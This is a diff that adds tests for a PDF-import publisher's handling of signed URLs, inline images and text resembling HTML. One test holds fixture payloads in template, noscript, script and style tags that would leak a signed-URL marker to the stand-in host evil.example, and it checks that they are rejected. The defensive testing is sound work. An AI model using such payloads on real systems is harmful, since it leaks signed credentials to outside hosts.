@@ -1082,3 +1082,103 @@ test("pdf-import prunedResult 未知字段计入 dropped 并不持久化", async
   expect(managed.includes("layout_extra")).toBe(false);
   await expectProjectDoesNotContain(SIGNED_URL_MARKER);
 });
+
+test("pdf-import 非表格正文的 template/noscript/script/style 资源整体拒绝发布", async () => {
+  const unsafe = [
+    `<template><img src="https://evil.example/x.png?${SIGNED_URL_MARKER}"></template>`,
+    `<noscript><img src="https://evil.example/x.png?${SIGNED_URL_MARKER}"></noscript>`,
+    `<script>var u="https://evil.example/x.png?${SIGNED_URL_MARKER}"</script>`,
+    `<style>a{background:url(https://evil.example/x.png?${SIGNED_URL_MARKER})}</style>`,
+  ];
+  const fixture = await downloadResponse(() => jsonl([row([
+    vendorPage(unsafe.map((html, index) => block(index, html))),
+    vendorPage([block(0, "Second page text")]),
+  ])]));
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(false);
+  if (result.ok) throw new Error("unsafe block was accepted");
+  expect(result.diagnostic.code).toBe("parse-resource-url-rejected");
+  expect(await parseSnapshots()).toEqual([]);
+  await expectProjectDoesNotContain(SIGNED_URL_MARKER);
+});
+
+test("pdf-import markdown 图片引用的签名 URL 被本地化，签名不进入工程", async () => {
+  const image = pngBytes();
+  const fixture = await downloadResponse(
+    (endpoint) => jsonl([row([
+      vendorPage([block(0, `前文 ![图](${endpoint}/asset?${SIGNED_URL_MARKER}) 后文`)]),
+      vendorPage([block(0, "Second page text")]),
+    ])]),
+    async (request, response) => {
+      expect(request.url).toBe(`/jobs/asset?${SIGNED_URL_MARKER}`);
+      response.end(image);
+    },
+  );
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(true);
+  if (!result.ok) throw new Error("markdown image localization failed");
+  const managed = await readSnapshotFile(result.snapshot, "result.jsonl");
+  const rows = managed.toString("utf8").trim().split("\n").map((line) => JSON.parse(line));
+  const content = rows[0].result.layoutParsingResults[0].prunedResult.parsing_res_list[0].block_content as string;
+  expect(content).toContain(`![图](assets/${sha256(image)}.png)`);
+  expect(content).toContain("前文");
+  expect(content).toContain("后文");
+  expect(content).not.toContain(SIGNED_URL_MARKER);
+  await expectProjectDoesNotContain(TOKEN, SIGNED_URL_MARKER);
+});
+
+test("pdf-import 含 HTML 样字符的普通正文逐字保留，不被重序列化吞字或转义", async () => {
+  const tricky = "x<y and z>w";
+  const ampersand = "A & B <span class=\"x\">ok</span>";
+  const fixture = await downloadResponse(() => jsonl([row([
+    vendorPage([block(0, tricky), block(1, ampersand)]),
+    vendorPage([block(0, "Second page text")]),
+  ])]));
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(true);
+  if (!result.ok) throw new Error("plain text publish failed");
+  const managed = await readSnapshotFile(result.snapshot, "result.jsonl");
+  const rows = managed.toString("utf8").trim().split("\n").map((line) => JSON.parse(line));
+  const blocks = rows[0].result.layoutParsingResults[0].prunedResult.parsing_res_list;
+  expect(blocks[0].block_content).toBe(tricky);
+  expect(blocks[1].block_content).toBe(ampersand);
+});
+
+test("pdf-import 非表格正文内联资源只做定点替换，其余文字逐字保留", async () => {
+  const image = pngBytes(3, 3);
+  const base64 = image.toString("base64");
+  const fixture = await downloadResponse(() => jsonl([row([
+    vendorPage([block(0, `x<y and z>w <img src="data:image/png;base64,${base64}"> tail & more`)]),
+    vendorPage([block(0, "Second page text")]),
+  ])]));
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(true);
+  if (!result.ok) throw new Error("inline resource publish failed");
+  const managed = await readSnapshotFile(result.snapshot, "result.jsonl");
+  const rows = managed.toString("utf8").trim().split("\n").map((line) => JSON.parse(line));
+  const content = rows[0].result.layoutParsingResults[0].prunedResult.parsing_res_list[0].block_content as string;
+  expect(content).toContain("x<y and z>w");
+  expect(content).toContain("tail & more");
+  expect(content).toContain(`src="assets/${sha256(image)}.png"`);
+  expect(content).not.toContain(base64);
+});
+
+test("pdf-import 无 markdown 页的块内联资源持久化 alias，快照可转换", async () => {
+  const image = pngBytes(3, 3);
+  const base64 = image.toString("base64");
+  const fixture = await downloadResponse(() => jsonl([row([
+    vendorPage([block(0, `<p>内联<img src="data:image/png;base64,${base64}"></p>`)]),
+    vendorPage([block(0, "Second page text")]),
+  ])]));
+  const result = await publishParseSnapshot({ root, task: fixture.task, response: fixture.response });
+  expect(result.ok).toBe(true);
+  if (!result.ok) throw new Error("inline alias publish failed");
+  const managed = await readSnapshotFile(result.snapshot, "result.jsonl");
+  const rows = managed.toString("utf8").trim().split("\n").map((line) => JSON.parse(line));
+  const page = rows[0].result.layoutParsingResults[0];
+  // 无原始 markdown 的页也必须落 markdown.images，alias 与 facts 一致。
+  expect(page.markdown).toBeTruthy();
+  const facts = JSON.parse((await readSnapshotFile(result.snapshot, "facts.json")).toString("utf8")) as PdfParseFactsFile;
+  for (const asset of facts.pages[0].assets)
+    expect(page.markdown.images[asset.vendorPath]).toBe(asset.path);
+});
